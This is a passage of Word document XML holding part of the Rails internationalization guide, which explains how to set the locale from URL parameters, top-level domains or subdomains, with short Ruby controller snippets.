            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="463CF5B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>set_locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BAAB6DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  I18n.locale = params[:locale] || I18n.default_locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F35DFCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A17A945" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This requires you to pass the locale as a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> query parameter as in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://example.com/books?locale=pt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. (This is, for example, Google’s approach.) So </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://localhost:3000?locale=pt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will load the Portuguese localization, whereas </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://localhost:3000?locale=de</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> would load the German localization, and so on. You may skip the next section and head over to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>Internationalize your application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> section, if you want to try things out by manually placing the locale in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and reloading the page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C58739" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Of course, you probably don’t want to manually include the locale in every </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> all over your application, or want the URLs look differently, e.g. the usual </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://example.com/pt/books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> versus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://example.com/en/books</w:t>
      </w:r>
      <w:r>
        <w:t>. Let’s discuss the different options you have.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE1504E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 Setting the Locale from the Domain Name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD27577" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">One option you have is to set the locale from the domain name where your application runs. For example, we want </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>www.example.com</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to load the English (or default) locale, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>www.example.es</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to load the Spanish locale. Thus the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>top-level domain name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is used for locale setting. This has several advantages:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F10164" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="296"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The locale is an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>obvious</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> part of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CF24C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="296"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>People intuitively grasp in which language the content will be displayed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C2E31F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="296"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>It is very trivial to implement in Rails.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16900DA2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="296"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Search engines seem to like that content in different languages lives at different, inter-linked domains.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F67AC96" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can implement it like this in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ApplicationController</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25E9C1A8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3754BAD4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>before_filter :set_locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="489023AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CB529FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>set_locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D18CB11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  I18n.locale = extract_locale_from_tld || I18n.default_locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B332431" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64003D8C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78460437" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># Get locale from top-level domain or return nil if such locale is not available</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="311CA273" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># You have to put something like:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3290E1FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   127.0.0.1 application.com</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B3A299B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   127.0.0.1 application.it</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="015B0DD5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   127.0.0.1 application.pl</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D2E54DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># in your /etc/hosts file to try this out locally</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="157A4368" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>extract_locale_from_tld</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E78B6B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  parsed_locale = request.host.split('.').last</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4805BEEA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  I18n.available_locales.include?(parsed_locale.to_sym) ? parsed_locale  : nil</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F79FCF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="13B71988" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We can also set the locale from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>subdomain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in a very similar way:</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4B44C71C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="725B4587" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve"># Get locale code from request subdomain (like </w:t>
            </w:r>
            <w:hyperlink r:id="rId538" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://it.application.local:3000</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3287450E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># You have to put something like:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A70EB0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#   127.0.0.1 gr.application.local</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28F617B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># in your /etc/hosts file to try this out locally</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03F84742" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>extract_locale_from_subdomain</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66D273E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  parsed_locale = request.subdomains.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32B58FAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  I18n.available_locales.include?(parsed_locale.to_sym) ? parsed_locale : nil</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A55DE79" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="28976074" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If your application includes a locale switching menu, you would then have something like this in it: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0CA3374" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="525C0F77" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1102652251"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>link_to("Deutsch", "#{APP_CONFIG[:deutsch_website_url]}#{request.env['REQUEST_URI']}")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5824C035" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">assuming you would set </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>APP_CONFIG[:deutsch_website_url]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to some value like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://www.application.de</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EE8DA5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This solution has aforementioned advantages, however, you may not be able or may not want to provide different localizations (“language versions”) on different domains. The most obvious solution would be to include locale code in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> params (or request path).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBCA4FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.5 Setting the Locale from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Params</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46128B00" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most usual way of setting (and passing) the locale would be to include it in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> params, as we did in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.locale = params[:locale]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>before_filter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the first example. We would like to have URLs like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>www.example.com/books?locale=ja</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>www.example.com/ja/books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in this case.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506B59F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This approach has almost the same set of advantages as setting the locale from the domain name: namely that it’s RESTful and in accord with the rest of the World Wide Web. It does require a little bit more work to implement, though.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41671FD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Getting the locale from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and setting it accordingly is not hard; including it in every </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and thus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>passing it through the requests</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is. To include an explicit option in every </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (e.g. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>link_to( books_url(:locale =&gt; I18n.locale))</w:t>
      </w:r>
      <w:r>
        <w:t>) would be tedious and probably impossible, of course.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3D3D0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails contains infrastructure for “centralizing dynamic decisions about the URLs” in its </w:t>
      </w:r>
      <w:hyperlink r:id="rId539" w:anchor="M000515" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>ApplicationController#default_url_options</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">, which is useful precisely in this scenario: it enables us to set “defaults” for </w:t>
      </w:r>
      <w:hyperlink r:id="rId540" w:anchor="M000503" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>url_for</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and helper methods dependent on it (by implementing/overriding this method).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445BA2D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We can include something like this in our </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> then:</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AA938A9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A82F5C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># app/controllers/application_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D1B03A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>default_url_options(options={})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7067A78E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  logger.debug "default_url_options is passed options: #{options.inspect}\n"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5393F1E3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  { :locale</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; I18n.locale }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DB382AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="68EF7127" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Every helper method dependent on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>url_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (e.g. helpers for named routes like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>root_path</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>root_url</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, resource routes like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>books_path</w:t>
      </w:r>
      <w:r>
